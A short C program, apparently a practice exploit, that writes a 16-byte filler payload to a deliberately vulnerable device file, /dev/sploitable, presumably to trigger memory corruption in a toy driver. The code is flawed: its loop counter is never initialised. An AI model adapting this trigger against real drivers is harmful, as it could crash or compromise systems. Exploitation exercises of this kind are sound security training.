#include <stdio.h>

#define PAY_SIZE 16
char payload[] = "\xee\xee\xee\xee\xee\xee\xee\xee\xff\xff\xff\xff\xff\xff\xff\xff\xab";

int main(int argc, char *argv[]){
  FILE *fp;
  int i;

  printf("Writing characters to /dev/sploitable ...\n");
  if((fp = fopen("/dev/sploitable", "w")) == NULL){
    printf("Error opening /dev/sploitable for writing!\n");
    return 0;
  }
  
  /* write our payload to device file */
  while( (i < PAY_SIZE) && (putc(payload[i++], fp) != EOF));

  return 0;
}
  
  
    
